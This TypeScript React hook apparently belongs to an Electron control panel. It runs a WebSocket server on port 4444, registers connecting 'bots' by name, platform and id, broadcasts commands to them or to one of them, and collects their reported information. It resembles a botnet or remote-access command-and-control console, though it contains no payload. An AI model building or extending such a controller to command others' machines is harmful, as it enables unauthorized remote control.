import { useState } from "react";
import { Bot, ServerStatus } from "./types";
const { WebSocket } = window.require("ws");
const http = window.require("http");

interface IUseSocket {
  startListening: () => void;
  stopListening: () => void;
  bots: Bot[];
  selectedBot: Bot;
  handleBotClick: (botId: number) => void;
  serverStatus: ServerStatus;
  broadcast: (message: string) => void;
  sendOne: (message: string, id: number) => void;
  showSingleBot: boolean;
  setShowSingleBot: (isOpen: boolean) => void;
}
export default function useSocket(): IUseSocket {
  const [bots, setBots] = useState([]);
  const [selectedBot, setSelectedBot] = useState<Bot>();
  const [showSingleBot, setShowSingleBot] = useState<boolean>(false);
  const [serverStatus, setServerStatus] = useState<ServerStatus>({
    connected: false,
    status: "disconnected",
  });
  const port = 4444;
  const server = http.createServer();
  const wss = new WebSocket.Server({ server });

  function broadcast(message: string) {
    bots.forEach((bot) => bot.socket.send(message));
  }
  function sendOne(message: string, botId: number) {
    const botIndex = bots.findIndex((bot) => bot.id === botId);
    bots[botIndex].socket.send(message);
  }
  function handleBotClick(botId: number) {
    sendOne("informations", botId);
    const botIndex = bots.findIndex((bot) => bot.id === botId);
    setSelectedBot(bots[botIndex]);
    setShowSingleBot(true);
  }
  function stopListening() {
    //
    // Implement server disconection
    //
    setServerStatus({
      connected: false,
      status: "disconnected",
    });
  }
  function startListening() {
    wss.on("connection", (ws: any) => {
      ws.on("message", (bufferMessage: Buffer) => {
        const message = bufferMessage.toString();
        if (message.includes("identification")) {
          const messageSplit = message.split(" ");
          setBots([
            ...bots,
            {
              name: messageSplit[1],
              platform: messageSplit[2],
              id: messageSplit[3],
              socket: ws,
            },
          ]);
        } else if (message.includes("informations")) {
          const messageSplit = message.split(" ");
          const selectedBotClone = { ...selectedBot };
          selectedBotClone.informations = JSON.parse(messageSplit[1]);
          setSelectedBot(selectedBotClone);
        } else if (message.includes("bye")) {
          const messageSplit = message.split(" ");
          const id = messageSplit[1];
          const botsClone = [...bots];
          const botIndex = botsClone.findIndex((bot) => bot.id === id);
          botsClone.splice(botIndex, 1);
          setBots(botsClone);
        }
      });
    });
    server.listen(port, () => {
      setServerStatus({
        connected: true,
        status: `listening on port ${port}`,
      });
    });
  }
  return {
    bots,
    broadcast,
    sendOne,
    startListening,
    stopListening,
    serverStatus,
    handleBotClick,
    selectedBot,
    showSingleBot,
    setShowSingleBot,
  };
}
